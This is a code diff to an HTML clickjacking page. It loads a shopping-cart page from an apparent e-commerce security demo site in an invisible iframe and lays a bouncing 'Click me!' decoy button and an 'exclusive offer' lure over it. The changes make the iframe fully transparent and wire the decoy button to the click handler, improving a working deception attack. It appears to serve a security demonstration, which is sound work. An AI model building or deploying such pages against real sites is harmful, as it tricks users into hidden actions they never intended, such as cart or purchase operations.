@@ -12,11 +12,11 @@
         <p class="text-lg text-gray-600">Click the button below to unlock your exclusive offer!</p>
     </div>
     <div id="iframe-wrapper" class="fixed top-[100px] left-1/2 transform -translate-x-1/2 w-[600px] h-[800px] max-w-[90vw] max-h-[80vh] z-0">
-        <iframe id="iframe-cart" class="absolute top-0 left-0 w-full h-full opacity-0.00001 z-10 pointer-events-none" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
+        <iframe id="iframe-cart" class="absolute top-0 left-0 w-full h-full opacity-0  z-10 pointer-events-none" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
         <div id="click-layer" class="absolute top-0 left-0 w-full h-full z-20 opacity-0">
             <div class="click-area absolute bottom-[20px] right-[20px] w-[150px] h-[60px] cursor-pointer" onclick="handleClick()"></div>
         </div>
-        <div class="fake-button absolute bottom-[20px] right-[20px] z-30 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce">Click me!</div>
+        <div class="fake-button absolute bottom-[20px] right-[20px] z-30 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce" onclick="handleClick()">Click me!</div>
     </div>
     <script>
         function checkIframeLoaded() {
